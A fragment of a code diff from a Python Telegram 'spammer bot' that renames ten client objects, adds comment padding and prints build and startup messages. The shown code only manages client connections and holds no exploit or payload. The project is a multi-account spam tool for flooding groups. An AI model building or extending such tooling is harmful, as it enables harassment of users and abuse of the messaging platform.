        await e.reply(text, parse_mode=None, link_preview=None )
-
-
-
+###########
+###########
+###########
+###########
 text = """CONGO SPAMBOT SUCCESSFULLY BUILD"""
-
+###########
+###########
+###########
+###########
 print(text)
 print("")
 print("DONE! 〄 ╚» ⟦★𓆩ᏒⲞⲞᗪ𓆪★⟧«╝ SᑭᗩᗰᗰEᖇ ᗷOT 〄 STARTED.\nNOW ADD YOUR SPAMMERBOT IN ONE GROUP THEM TYPE .alive With Sudo Account")
+###########
+###########
+###########      
+###########
 if len(sys.argv) not in (1, 3, 4):
     try:
-        luc.disconnect()
+        omp.disconnect()
     except Exception:
         pass
     try:
-        luc2.disconnect()
+        omp2.disconnect()
     except Exception:
         pass
     try:
-        luc3.disconnect()
+        omp3.disconnect()
     except Exception:
         pass
     try:
-        luc4.disconnect()
+        omp4.disconnect()
     except Exception:
         pass
     try:
-        luc5.disconnect()
+        omp5.disconnect()
     except Exception:
         pass
     try:
-        luc6.disconnect()
+        omp6.disconnect()
     except Exception:
         pass
     try:
-        luc7.disconnect()
+        omp7.disconnect()
     except Exception:
         pass
     try:
-        luc8.disconnect()
+        omp8.disconnect()
     except Exception:
         pass
     try:
-        luc9.disconnect()
+        omp9.disconnect()
     except Exception:
         pass
     try:
-        luc10.disconnect()
+        omp10.disconnect()
     except Exception:
         pass
 else:
     try:
-        luc.run_until_disconnected()
+        omp.run_until_disconnected()
     except Exception:
         pass
     try:
-        luc2.run_until_disconnected()
+        omp2.run_until_disconnected()
     except Exception:
         pass
     try:
-        luc3.run_until_disconnected()
+        omp3.run_until_disconnected()
     except Exception:
         pass
     try:
-        luc4.run_until_disconnected()
+        omp4.run_until_disconnected()
     except Exception:
         pass
     try:
-        luc5.run_until_disconnected()
+        omp5.run_until_disconnected()
     except Exception:
         pass
     try:
-        luc6.run_until_disconnected()
+        omp6.run_until_disconnected()
     except Exception:
         pass
     try:
-        luc7.run_until_disconnected()
+        omp7.run_until_disconnected()
     except Exception:
         pass
     try:
-        luc8.run_until_disconnected()
+        omp8.run_until_disconnected()
     except Exception:
         pass
     try:
-        luc9.run_until_disconnected()
+        omp9.run_until_disconnected()
     except Exception:
         pass
     try:
-        luc10.run_until_disconnected()
+        omp10.run_until_disconnected()
     except Exception:
         pass
+###########
+###########
+###########      
+###########
